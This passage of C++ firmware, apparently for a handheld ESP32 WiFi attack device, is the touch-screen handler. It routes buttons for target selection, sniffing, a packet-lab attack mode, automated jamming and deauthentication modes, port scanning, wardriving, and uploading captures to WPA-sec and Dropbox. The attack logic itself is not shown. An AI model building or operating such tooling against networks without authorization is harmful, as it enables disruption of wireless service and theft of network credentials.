      return;
    }

    if (hit(btnWifiRescan, tx, ty)) {
      if (apSelected >= 0 && apSelected < apCount) {
        target = aps[apSelected];
        hasTarget = true;
      }
      lockChannel = cfg.wifi_defaultLockChannel;
      setScreen(ScreenId::TARGET_DETAILS);
      waitTouchRelease();
      return;
    }

    if (hit(btnWifiConnect, tx, ty)) {
      if (apSelected < 0 || apSelected >= apCount) {
        wifiConnectStatus = "Select a network first";
        drawWifiScan();
        waitTouchRelease();
        return;
      }
      const ApRecord& selectedAp = aps[apSelected];
      wifiConnectSelectedIdx = apSelected;
      wifiConnectSsid = selectedAp.ssid.isEmpty() ? "(hidden)" : selectedAp.ssid;
      wifiConnectNeedsPassword = (selectedAp.auth != WIFI_AUTH_OPEN);
      wifiPwShift = false;
      wifiPwSymbols = false;
      wifiConnectRevealPassword = false;
      wifiConnectShowSavedDrawer = false;
      wifiConnectShowPasswordModal = wifiConnectNeedsPassword && !ND_HW_KEYBOARD;
      if (wifiConnectNeedsPassword) {
        wifiConnectPassword = (cfg.wifi_ssid == selectedAp.ssid) ? cfg.wifi_password : "";
      } else {
        wifiConnectPassword = "";
      }
      setScreen(ScreenId::WIFI_CONNECT);
      waitTouchRelease();
      return;
    }

    const int maxRows = min(4, max(1, (wifiListBottomY - wifiListTopY) / max(1, wifiRowH)));
    const int maxScroll = (apCount > maxRows) ? (apCount - maxRows) : 0;

    if (hit(btnWifiUp, tx, ty)) {
      apScroll = clampi(apScroll - 1, 0, maxScroll);
      drawWifiScan();
      resetTouchLatch();
      return;
    }
    if (hit(btnWifiDown, tx, ty)) {
      apScroll = clampi(apScroll + 1, 0, maxScroll);
      drawWifiScan();
      resetTouchLatch();
      return;
    }

    for (int r = 0; r < 4; r++) {
      const int idx = apScroll + r;
      if (idx >= apCount) continue;
      if (hit(btnWifiChecks[r], tx, ty)) {
        wifiTogglePrimedIndex(idx);
        drawWifiScan();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiRows[r], tx, ty)) {
        apSelected = idx;
        wifiConnectSelectedIdx = idx;
        drawWifiScan();
        waitTouchRelease();
        return;
      }
    }

    waitTouchRelease();
    return;
  }

// CONFIRM_TARGET: Confirmation popup before opening Target Ops
  if (screen == ScreenId::CONFIRM_TARGET) {
    if (btnWifiYes.w == 0) layoutHome();  // Initialize buttons if needed
    
    if (hit(btnWifiYes, tx, ty)) {
      // User confirmed - proceed to Target Ops
      lockChannel = cfg.wifi_defaultLockChannel;
      setScreen(ScreenId::TARGET_DETAILS);
      waitTouchRelease();
      return;
    }
    if (hit(btnWifiNo, tx, ty)) {
      // User canceled - go back to WiFi scan
      setScreen(ScreenId::WIFI_SCAN);
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

// TARGET_DETAILS: Main target operations screen
  if (screen == ScreenId::TARGET_DETAILS) {
    // Background tick for RAW logging
    rawCaptureTick();

    if (hit(btnTargetBack, tx, ty)) {
      setScreen(ScreenId::HOME);
      autoMode = AutoMode::NONE;
      if (sniffActive) stopSniff();
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetAutomate, tx, ty)) {
      setScreen(ScreenId::AUTOMATE_MENU);
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetMonitor, tx, ty)) {
      monitorReturnScreen = ScreenId::TARGET_DETAILS;
      setScreen(ScreenId::MONITOR);
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetLock, tx, ty)) {
      lockChannel = !lockChannel;
      if (lockChannel && hasTarget) {
        applyChannelLockIfNeeded();
        Serial.printf("[ops] channel locked to %d\n", target.channel);
      } else {
        Serial.println("[ops] channel unlocked");
      }
      drawTargetDetails();
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetSniff, tx, ty)) {
      const bool running = sniffActive || (autoMode != AutoMode::NONE);
      if (running) {
        disengageAutoMode();
        if (sniffActive) stopSniff();
        Serial.println("[ops] START/STOP: stopped active functions");
      } else {
        if (!hasTarget) {
          Serial.println("[ops] START/STOP: no target selected");
        } else {
          if (!confirmWebRiskAction(RiskyWebAction::START_SNIFF, "Start")) {
            waitTouchRelease();
            return;
          }
          startSniff();
          Serial.println("[ops] START/STOP: started sniff");
        }
      }
      drawTargetDetails();
      resetTouchLatch();
      return;
    }

    waitTouchRelease();
    return;
  }

// ABOUT / placeholders: Back only
  if (screen == ScreenId::ABOUT || screen == ScreenId::TARGETS_PLACEHOLDER) {
    if (hit(btnBack, tx, ty)) setScreen(ScreenId::HOME);
    waitTouchRelease(); return;
  }

  // PUSH1T screen
  if (screen == ScreenId::PUSH1T_SCREEN) {
    push1tScreenTick_UI(tx, ty);
    return;
  }

  // SP3CTER screen
  if (screen == ScreenId::SP3CTER_SCREEN) {
    specterScreenTick_UI(tx, ty);
    return;
  }

  // PACKETLAB_MENU
  if (screen == ScreenId::PACKETLAB_MENU) {
    PACKETLABMenuTick_UI(tx, ty);
    return;
  }

  // PACKETLAB_SET_TARGET
  if (screen == ScreenId::PACKETLAB_SET_TARGET) {
    PACKETLABSetTargetTick_UI(tx, ty);
    return;
  }

  // PACKETLAB_MONITOR
  if (screen == ScreenId::PACKETLAB_MONITOR) {
    if (hit(btnPACKETLABMonBack, tx, ty)) {
      if (PACKETLABIsAttacking()) {
        Serial.println("[PACKETLAB_MON] STOP pressed - stopping attack");
        PACKETLABStopAttack();
        PACKETLABCloseCaptures();
        // Stay on monitor screen so user can see the final summary
        PACKETLABMonLastUpdateMs = 0;  // force immediate redraw
      } else {
        Serial.println("[PACKETLAB_MON] BACK pressed - returning to menu");
        setScreen(ScreenId::PACKETLAB_MENU);
      }
      waitTouchRelease();
      return;
    }
    if (hit(btnPACKETLABMonFiles, tx, ty)) {
      Serial.println("[PACKETLAB_MON] FILES button pressed");
      monitorPushLine(TFT_CYAN,  "-- FILES --");
      if (PACKETLABPcapPath[0])
        monitorPushLine(TFT_WHITE, "%.60s", PACKETLABPcapPath);
      else
        monitorPushLine(0x7BCF, "(no pcap – SD unavail)");
      if (PACKETLABSessionLogPath[0])
        monitorPushLine(TFT_WHITE, "%.60s", PACKETLABSessionLogPath);
      else
        monitorPushLine(0x7BCF, "(no log  – SD unavail)");
      drawPACKETLABMonitorTerminal();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // MONITOR
  if (screen == ScreenId::MONITOR) {
#if defined(NEONDRIVE_TARGET_M5TAB5)
    if (hit(btnMonitorBack, tx, ty)) {
      setScreen(monitorReturnScreen);
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTabLive, tx, ty)) {
      monitorTab5Tab = MonitorTab5Tab::LIVE;
      drawMonitor();
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTabSd, tx, ty)) {
      monitorTab5Tab = MonitorTab5Tab::SD;
      monitorFileUseSd = true;
      monitorLoadFileDirFs(SD, monitorSdPath, true);
      drawMonitor();
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTabLfs, tx, ty)) {
      monitorTab5Tab = MonitorTab5Tab::LITTLEFS;
      monitorFileUseSd = false;
      monitorLoadFileDirFs(LittleFS, monitorLfsPath, false);
      drawMonitor();
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTabView, tx, ty)) {
      monitorTab5Tab = MonitorTab5Tab::FILE_VIEW;
      drawMonitor();
      waitTouchRelease();
      return;
    }
    if (monitorTab5Tab == MonitorTab5Tab::LIVE) {
      if (hit(btnMonitorPause, tx, ty)) { monitorTab5Paused = !monitorTab5Paused; drawMonitor(); waitTouchRelease(); return; }
      if (hit(btnMonitorClear, tx, ty)) { monitorLineCount = 0; drawMonitor(); waitTouchRelease(); return; }
      if (hit(btnMonitorAuto, tx, ty)) { monitorTab5AutoScroll = !monitorTab5AutoScroll; drawMonitor(); waitTouchRelease(); return; }
      if (hit(btnMonitorFilter, tx, ty)) { monitorTab5Filter = (uint8_t)((monitorTab5Filter + 1) & 0x03); drawMonitor(); waitTouchRelease(); return; }
    } else if (monitorTab5Tab == MonitorTab5Tab::SD || monitorTab5Tab == MonitorTab5Tab::LITTLEFS) {
      if (hit(btnMonitorUpDir, tx, ty)) { monitorGoParentDir(); drawMonitor(); waitTouchRelease(); return; }
      if (hit(btnMonitorUp, tx, ty)) { monitorFileScroll = max(0, monitorFileScroll - 1); drawMonitor(); waitTouchRelease(); return; }
      if (hit(btnMonitorDown, tx, ty)) {
        int maxScroll = max(0, monitorFileCount - monitorFileVisibleRows);
        monitorFileScroll = min(maxScroll, monitorFileScroll + 1);
        drawMonitor();
        waitTouchRelease();
        return;
      }
      if (tx >= monitorFileListX && tx < (monitorFileListX + monitorFileListW) &&
          ty >= monitorFileListY && ty < (monitorFileListY + monitorFileListH)) {
        const int row = (ty - monitorFileListY) / monitorFileRowH;
        const int idx = monitorFileScroll + row;
        if (idx >= 0 && idx < monitorFileCount) {
          const MonitorFileEntry& e = monitorFiles[idx];
          if (e.isDir) {
            monitorEnterDir(e.name);
          } else {
            if (strcmp(monitorFilePath, "/") == 0) {
              snprintf(monitorViewPath, sizeof(monitorViewPath), "/%s", e.name);
            } else {
              snprintf(monitorViewPath, sizeof(monitorViewPath), "%s/%s", monitorFilePath, e.name);
            }
            monitorViewUseSd = (monitorTab5Tab == MonitorTab5Tab::SD);
            monitorLoadViewFile();
            monitorTab5Tab = MonitorTab5Tab::FILE_VIEW;
          }
          if (monitorTab5Tab == MonitorTab5Tab::SD) strncpy(monitorSdPath, monitorFilePath, sizeof(monitorSdPath) - 1);
          else strncpy(monitorLfsPath, monitorFilePath, sizeof(monitorLfsPath) - 1);
          drawMonitor();
          waitTouchRelease();
          return;
        }
      }
    } else if (monitorTab5Tab == MonitorTab5Tab::FILE_VIEW) {
      if (hit(btnMonitorUp, tx, ty)) { monitorViewScroll = max(0, monitorViewScroll - 1); drawMonitor(); waitTouchRelease(); return; }
      if (hit(btnMonitorDown, tx, ty)) { monitorViewScroll++; drawMonitor(); waitTouchRelease(); return; }
    }
    waitTouchRelease();
    return;
#endif
    if (hit(btnMonitorBack, tx, ty)) {
      setScreen(monitorReturnScreen);
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTab1, tx, ty)) {
      monitorMode = MonitorMode::LIVE;
      monitorLastUpdateMs = 0;
      drawMonitor();
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTab2, tx, ty)) {
      monitorMode = MonitorMode::FILES;
      if (monitorFilePath[0] == '\0') strcpy(monitorFilePath, "/");
      monitorLoadFileDir(monitorFilePath);
      monitorLastUpdateMs = 0;
      drawMonitor();
      waitTouchRelease();
      return;
    }

    if (monitorMode == MonitorMode::FILES) {
      if (hit(btnMonitorUpDir, tx, ty)) {
        monitorGoParentDir();
        drawMonitor();
        waitTouchRelease();
        return;
      }
      if (hit(btnMonitorUp, tx, ty)) {
        int maxScroll = monitorFileCount - monitorFileVisibleRows;
        if (maxScroll < 0) maxScroll = 0;
        monitorFileScroll = clampi(monitorFileScroll - 1, 0, maxScroll);
        drawMonitor();
        waitTouchRelease();
        return;
      }
      if (hit(btnMonitorDown, tx, ty)) {
        int maxScroll = monitorFileCount - monitorFileVisibleRows;
        if (maxScroll < 0) maxScroll = 0;
        monitorFileScroll = clampi(monitorFileScroll + 1, 0, maxScroll);
        drawMonitor();
        waitTouchRelease();
        return;
      }

      if (tx >= monitorFileListX && tx < (monitorFileListX + monitorFileListW) &&
          ty >= monitorFileListY && ty < (monitorFileListY + monitorFileListH)) {
        const int row = (ty - monitorFileListY) / monitorFileRowH;
        const int idx = monitorFileScroll + row;
        if (idx >= 0 && idx < monitorFileCount) {
          const MonitorFileEntry& e = monitorFiles[idx];
          if (e.isDir) {
            monitorEnterDir(e.name);
            drawMonitor();
          } else {
            char fullPath[128];
            if (strcmp(monitorFilePath, "/") == 0) {
              snprintf(fullPath, sizeof(fullPath), "/%s", e.name);
            } else {
              snprintf(fullPath, sizeof(fullPath), "%s/%s", monitorFilePath, e.name);
            }
            char info[80];
            snprintf(info, sizeof(info), "%s (%lu B)", e.name, (unsigned long)e.size);
            monitorSetFileInfo(info);
            Serial.printf("[logs] selected file: %s\n", fullPath);
            drawMonitor();
          }
          waitTouchRelease();
          return;
        }
      }
    }
    waitTouchRelease();
    return;
  }

  // RECON
  if (screen == ScreenId::RECON) {
    if (hit(btnReconBack, tx, ty)) {
      stopReconDeauthHunter();
      if (reconScanner.isRunning()) reconScanner.stop();
      setScreen(ScreenId::HOME);
      waitTouchRelease();
      return;
    }
    if (hit(btnReconModeDeauth, tx, ty)) {
      reconView = ReconView::DEAUTH;
      drawRecon();
      waitTouchRelease();
      return;
    }
    if (hit(btnReconModePort, tx, ty)) {
      reconView = ReconView::PORT_SCAN;
      drawRecon();
      waitTouchRelease();
      return;
    }

    if (reconView == ReconView::DEAUTH) {
      if (hit(btnReconChMinus, tx, ty)) {
        reconSelectedChannel = (reconSelectedChannel <= 1) ? 13 : (reconSelectedChannel - 1);
        if (reconChannelLock) {
          DeauthHunter::setChannelFilter(reconSelectedChannel);
        }
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (hit(btnReconChPlus, tx, ty)) {
        reconSelectedChannel = (reconSelectedChannel >= 13) ? 1 : (reconSelectedChannel + 1);
        if (reconChannelLock) {
          DeauthHunter::setChannelFilter(reconSelectedChannel);
        }
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (hit(btnReconLock, tx, ty)) {
        reconChannelLock = !reconChannelLock;
        if (reconChannelLock) {
          DeauthHunter::setChannelFilter(reconSelectedChannel);
        } else {
          DeauthHunter::clearFilters();
        }
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (hit(btnReconStart, tx, ty)) {
        if (!reconActive) {
          if (reconScanner.isRunning()) reconScanner.stop();
          bool forceDisconnect = ((int32_t)(reconDeauthConfirmUntilMs - millis()) > 0);
          if (!startReconDeauthHunter(forceDisconnect)) {
            drawRecon();
            waitTouchRelease();
            return;
          }
        } else {
          stopReconDeauthHunter();
        }
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (hit(btnReconClear, tx, ty)) {
        DeauthHunter::reset();
        reconLastLogCount = 0;
        reconLastTotalEvents = 0;
        reconLastDrawChannel = DeauthHunter::getCurrentChannel();
        clearReconConsoleArea();
        reconStatusLine = "Deauth counters reset";
        drawRecon();
        waitTouchRelease();
        return;
      }
    } else {
      if (hit(btnReconPortStartStop, tx, ty)) {
        if (reconScanner.isRunning()) {
          reconScanner.stop();
          reconStatusLine = "Port scan stopped";
        } else {
          if (reconActive) stopReconDeauthHunter();
          if (!wifiStaHasValidIp()) {
            reconStatusLine = "Connect WiFi in STA mode before scanning";
          } else if (!reconScanner.start()) {
            reconStatusLine = reconScanner.errorMessage();
          } else {
            reconPortScroll = 0;
            reconHostSelected = -1;
            reconStatusLine = "Port scan started";
          }
        }
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (hit(btnReconPortExport, tx, ty)) {
        if (!sdReady && !mountSdCard(false)) {
          reconStatusLine = "SD not ready";
        } else if (reconScanner.exportCsv(SD, "/recon_scan.csv")) {
          reconStatusLine = "Exported /recon_scan.csv";
        } else {
          reconStatusLine = "CSV export failed";
        }
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (hit(btnReconPortUp, tx, ty)) {
        if (reconPortScroll > 0) reconPortScroll--;
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (hit(btnReconPortDown, tx, ty)) {
        const int rows = max(1, reconHostListRect.h / max(1, reconHostRowH));
        const int maxScroll = max(0, (int)reconScanner.hostCount() - rows);
        if (reconPortScroll < maxScroll) reconPortScroll++;
        drawRecon();
        waitTouchRelease();
        return;
      }
      if (pointInRect(tx, ty, reconHostListRect)) {
        const int row = (ty - reconHostListRect.y) / max(1, reconHostRowH);
        const int idx = (int)reconPortScroll + row;
        if (idx >= 0 && idx < reconScanner.hostCount()) {
          reconHostSelected = (int8_t)idx;
          drawRecon();
          waitTouchRelease();
          return;
        }
      }
    }
    waitTouchRelease();
    return;
  }

  // PORT SCANNER
  if (screen == ScreenId::PORT_SCANNER) {
    if (hit(btnPSBack, tx, ty)) {
      if (psActive) { portScanner.stop(); psActive = false; }
      setScreen(ScreenId::HOME); waitTouchRelease(); return;
    }
    if (hit(btnPSDeep, tx, ty)) {
      if (!portScanner.isRunning()) {
        psDeepScanEnabled = !psDeepScanEnabled;
      }
      drawPortScanner();
      waitTouchRelease();
      return;
    }
    if (hit(btnPSMode, tx, ty)) {
      if (!portScanner.isRunning()) psDeepScanEnabled = !psDeepScanEnabled;
      drawPortScanner();
      waitTouchRelease();
      return;
    }
    if (hit(btnPSStart, tx, ty)) {
      if (psActive) { portScanner.stop(); psActive = false; }
      else { if (portScanner.start(psDeepScanEnabled)) psActive = true; }
      drawPortScanner(); waitTouchRelease(); return;
    }
    if (hit(btnPSExport, tx, ty)) { psSaveToSD(); waitTouchRelease(); return; }
    if (hit(btnPSClr, tx, ty)) {
      portScanner.clearResults();
      psActive = false;
      psScrollOffset=0; psSelectedRow=-1; psLastSelectedRow=-1;
      psLastHostCount=0; psLastPct=0; psLastState=0; psLayoutDrawn=false;
      psLastRatePerSec=0; psLastPortsAttempted=0; psLastEventCount=0;
      psDirtyCount=0; psNeedsFullStatic=true;
      drawPortScanner(); waitTouchRelease(); return;
    }
    if (hit(btnPSScrollUp, tx, ty)) {
      if (psScrollOffset > 0) {
        psScrollOffset--;
        drawPortScanner();
      }
      waitTouchRelease();
      return;
    }
    if (hit(btnPSScrollDown, tx, ty)) {
      const int total = (int)portScanner.hostCount();
      const int maxScroll = max(0, total - PS_HOST_ROWS_VISIBLE);
      if ((int)psScrollOffset < maxScroll) {
        psScrollOffset++;
        drawPortScanner();
      }
      waitTouchRelease();
      return;
    }
    const int scrollTrackY = psHostsRect.y + 16;
    const int scrollTrackH = psHostsRect.h - 30;
    const int scrollBarX = psHostsRect.x + psHostsRect.w - 9;
    if (tx >= scrollBarX && tx < (scrollBarX + 8) &&
        ty >= scrollTrackY && ty < (scrollTrackY + scrollTrackH)) {
      const int total = (int)portScanner.hostCount();
      const int maxScroll = max(0, total - PS_HOST_ROWS_VISIBLE);
      if (maxScroll > 0) {
        const int handleH = max(12, (scrollTrackH * PS_HOST_ROWS_VISIBLE) / total);
        int relY = ty - scrollTrackY - (handleH / 2);
        relY = constrain(relY, 0, max(0, scrollTrackH - handleH));
        const int nextScroll = (relY * maxScroll) / max(1, scrollTrackH - handleH);
        if (nextScroll != (int)psScrollOffset) {
          psScrollOffset = (uint8_t)nextScroll;
          drawPortScanner();
        }
      }
      waitTouchRelease();
      return;
    }
    // Event log scrollbar / auto-scroll toggle
    const int evCount = (int)portScanner.eventCount();
    const int evShown = 6;
    const int maxEvScroll = max(0, evCount - evShown);
    if (pointInRect(tx, ty, psEventsRect)) {
      if (tx >= psEventsRect.x + psEventsRect.w - 10 && maxEvScroll > 0) {
        const int eTrackY = psEventsRect.y + 14;
        const int eTrackH = psEventsRect.h - 18;
        const int eKnobH = max(10, (eTrackH * evShown) / max(1, evCount));
        int relY = ty - eTrackY - (eKnobH / 2);
        relY = constrain(relY, 0, max(0, eTrackH - eKnobH));
        psEventScroll = (relY * maxEvScroll) / max(1, eTrackH - eKnobH);
        psEventAutoScroll = false;
        drawPortScanner();
        waitTouchRelease();
        return;
      }
      if (ty <= psEventsRect.y + 12) {
        psEventAutoScroll = !psEventAutoScroll;
        drawPortScanner();
        waitTouchRelease();
        return;
      }
      // quick tap top/bottom half for manual scroll step
      if (maxEvScroll > 0 && !psEventAutoScroll) {
        const int midY = psEventsRect.y + psEventsRect.h / 2;
        if (ty < midY && psEventScroll > 0) psEventScroll--;
        if (ty >= midY && psEventScroll < maxEvScroll) psEventScroll++;
        drawPortScanner();
        waitTouchRelease();
        return;
      }
    }
    if (pointInRect(tx, ty, psHostsRect)) {
      const int hostRowH = (psHostsRect.h - 24) / PS_HOST_ROWS_VISIBLE;
      const int r = (ty - (psHostsRect.y + 16)) / max(1, hostRowH);
      const uint8_t idx = psScrollOffset+(uint8_t)r;
      if (idx < portScanner.hostCount()) { psSelectedRow=(int16_t)idx; drawPortScanner(); }
    }
    waitTouchRelease(); return;
  }

  // RECON HOME
  if (screen == ScreenId::RECON_HOME) {
    if (hit(btnReconHomeBack,   tx, ty)) { setScreen(ScreenId::HOME);         waitTouchRelease(); return; }
    if (hit(btnReconHomeDeauth, tx, ty)) { setScreen(ScreenId::RECON);        waitTouchRelease(); return; }
    if (hit(btnReconHomeNetScan,tx, ty)) { setScreen(ScreenId::PORT_SCANNER); waitTouchRelease(); return; }
    if (hit(btnReconHomeAnalyze,tx, ty)) { waitTouchRelease(); return; }
    waitTouchRelease(); return;
  }

  if (screen == ScreenId::WARDRIVE) {
    handleWardriveTouch(tx, ty);
    return;
  }

  // AUTOMATE MENU (Scrollable mode selection with touch buttons)
  if (screen == ScreenId::AUTOMATE_MENU) {
    rawCaptureTick();

    if (hit(btnAutoBack, tx, ty)) {
      setScreen(ScreenId::TARGET_DETAILS);
      resetTouchLatch();
      return;
    }

    if (hit(btnAutoY0INK, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_Y0INK, "Engage Y0INK")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::Y0INK); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
    }
    if (hit(btnAutoRAW, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_RAW, "Engage RAW")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::SP3CTER); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
    }
    if (hit(btnAutoSCOPE, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_SCOPE, "Engage SCOPE")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::SCOPE); setScreen(ScreenId::SCOPE_GRAPH); resetTouchLatch(); return;
    }
    if (hit(btnAutoJAMMIT, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_JAMMIT, "Engage JAMMIT")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::JAMMIT); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
    }

    waitTouchRelease();
    return;
  }

// CONFIG menu
  if (screen == ScreenId::CONFIG) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::HOME); waitTouchRelease(); return; }
    if (hit(btnCfgWifi, tx, ty)) { setScreen(ScreenId::WIFI_CONFIG); waitTouchRelease(); return; }
    if (hit(btnCfgWifiConnect, tx, ty)) { 
      // Open unified WiFi scanner screen.
      wifiConnectStatus = "Press Scan to find networks";
      Serial.println("[cfg] Opening WiFi Scanner");
      setScreen(ScreenId::WIFI_SCAN); 
      drawWifiScan();
      waitTouchRelease();
      return; 
    }
    if (hit(btnCfgWebserver, tx, ty)) { 
      Serial.println("[cfg] Switching to Webserver screen");
      setScreen(ScreenId::WEBSERVER); 
      drawWebserver();
      waitTouchRelease();
      return; 
    }
    if (hit(btnCfgStartup, tx, ty)) {
      setScreen(ScreenId::STARTUP_CONFIG);
      waitTouchRelease();
      return;
    }
    if (hit(btnCfgTelemetry, tx, ty)) {
      setScreen(ScreenId::TELEMETRY_CONFIG);
      waitTouchRelease();
      return;
    }
    if (hit(btnCfgLed, tx, ty)) {
      Serial.println("[cfg] Opening LED Control");
      setScreen(ScreenId::LED_CONTROL);
      waitTouchRelease();
      return;
    }
    if (hit(btnCfgSync, tx, ty)) {
      Serial.println("[cfg] Opening Sync screen");
      setScreen(ScreenId::SYNC);
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // SYNC
  if (screen == ScreenId::SYNC) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    if (hit(btnSyncDropbox, tx, ty) && !cfg.dropbox_token.isEmpty()) {
      waitTouchRelease();
      strncpy(syncDropboxStatus, "Syncing...", sizeof(syncDropboxStatus)-1);
      drawSync();
      syncAllDropbox();
      drawSync();
      return;
    }

    if (hit(btnSyncWpasec, tx, ty) && !cfg.wpasec_apikey.isEmpty()) {
      waitTouchRelease();
      wpasecSyncStatus = "Syncing...";
      drawSync();
      syncWithWPASec();
      drawSync();
      return;
    }

    if (hit(btnSyncWigle, tx, ty)) {
      // Wigle not implemented on device — redirect to web UI
      drawSync();
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }

  // WIFI_CONFIG
  if (screen == ScreenId::WIFI_CONFIG) {
    bool changed = false;

    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    if (hit(btnSave, tx, ty)) {
      if (saveConfig(cfg)) {
        configDirty = false;
        Serial.println("[cfg] save via UI");
        printConfigSerial(cfg);
      }
      drawWifiConfig();
      waitTouchRelease();
      return;
    }

    if (hit(btnHopMinus, tx, ty)) { bumpInt(cfg.wifi_channelHopInterval, -50, 100, 5000); changed = true; }
    if (hit(btnHopPlus,  tx, ty)) { bumpInt(cfg.wifi_channelHopInterval, +50, 100, 5000); changed = true; }

    if (hit(btnScanMinus, tx, ty)) { bumpInt(cfg.wifi_scanDuration, -250, 250, 15000); changed = true; }
    if (hit(btnScanPlus,  tx, ty)) { bumpInt(cfg.wifi_scanDuration, +250, 250, 15000); changed = true; }

    if (hit(btnDeauthToggle, tx, ty)) { cfg.wifi_enableDeauth = !cfg.wifi_enableDeauth; changed = true; }
    if (hit(btnWifiDefaultLockToggle, tx, ty)) { cfg.wifi_defaultLockChannel = !cfg.wifi_defaultLockChannel; changed = true; }

    if (changed) {
      configDirty = true;
      Serial.println("[cfg] changed via UI (dirty)");
      drawWifiConfig();
    }

    waitTouchRelease();
    return;
  }

  // STARTUP_CONFIG
  if (screen == ScreenId::STARTUP_CONFIG) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    if (hit(btnStartupAutoReconnect, tx, ty)) {
      cfg.startup_autoReconnectPrompt = !cfg.startup_autoReconnectPrompt;
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }

    if (hit(btnStartupDefaultLockToggle, tx, ty)) {
      cfg.wifi_defaultLockChannel = !cfg.wifi_defaultLockChannel;
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }

#if defined(NEONDRIVE_TARGET_M5TAB5)
    if (hit(btnStartupAutoRotate, tx, ty)) {
      cfg.startup_autoRotate = !cfg.startup_autoRotate;
      if (cfg.startup_autoRotate) {
        g_tab5RotationCandidate = g_tab5RotationCurrent;
        g_tab5RotationCandidateSinceMs = millis();
      }
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }
#endif

#if defined(NEONDRIVE_TARGET_CYD)
    if (hit(btnStartupManualRotation, tx, ty)) {
      int next = (cfg.startup_manualRotation + 1) & 3;
      applyCydManualRotation(next, false);
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }
#endif

    if (hit(btnStartupHypercube, tx, ty)) {
      cfg.ui_hypercube = !cfg.ui_hypercube;
      HypercubeWidget::setEnabled(cfg.ui_hypercube);
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }

    if (hit(btnStartupWebserver, tx, ty)) {
      cfg.startup_webserver = !cfg.startup_webserver;
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }

  // TELEMETRY_CONFIG
  if (screen == ScreenId::TELEMETRY_CONFIG) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    bool changed = false;
    if (hit(btnTelemetryMinus, tx, ty)) {
      bumpInt(cfg.telemetry_monitorIntervalMs, -100, 200, 2000);
      changed = true;
    }
    if (hit(btnTelemetryPlus, tx, ty)) {
      bumpInt(cfg.telemetry_monitorIntervalMs, 100, 200, 2000);
      changed = true;
    }
    if (hit(btnTelemetryVerboseToggle, tx, ty)) {
      cfg.telemetry_verboseSerial = !cfg.telemetry_verboseSerial;
      verboseSerial = cfg.telemetry_verboseSerial;
      changed = true;
    }

    if (changed) {
      saveConfig(cfg);
      monitorLastUpdateMs = 0;
      drawTelemetryConfig();
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }

  // SCOPE_GRAPH
  if (screen == ScreenId::SCOPE_GRAPH) {
    if (hit(btnScopeBack, tx, ty)) {
      if (scopeScanActive) {
        WiFi.scanDelete();
        scopeScanActive = false;
        wifiIsScanning = false;
      }
      setScreen(ScreenId::AUTOMATE_MENU);
      waitTouchRelease();
      return;
    }
    if (hit(btnScopeRefresh, tx, ty)) {
      if (!scopeScanActive && !wifiIsScanning) {
        scopeScanActive = startWifiScanAsync();
        if (scopeScanActive) {
          scopeScanStartedMs = millis();
        } else {
          wifiIsScanning = false;
        }
      }
      drawScopeGraph();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // LED_CONTROL
  if (screen == ScreenId::LED_CONTROL) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    ledSliderDraggingHue = ledPointInSlider(tx, ty, LED_HUE_Y);
    ledSliderDraggingBrightness = !ledSliderDraggingHue && ledPointInSlider(tx, ty, LED_BRIGHTNESS_Y);
    if (!ledSliderDraggingHue && !ledSliderDraggingBrightness) {
      waitTouchRelease();
      return;
    }

    bool changed = false;
    if (ledSliderDraggingHue) {
      changed = ledSetHueFromTouchX(tx);
    } else if (ledSliderDraggingBrightness) {
      changed = ledSetBrightnessFromTouchX(tx);
    }
    if (changed) {
      applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);
      drawLedControlDynamic();
    }

    // Drag handling: keep updating slider while finger is down.
    while (true) {
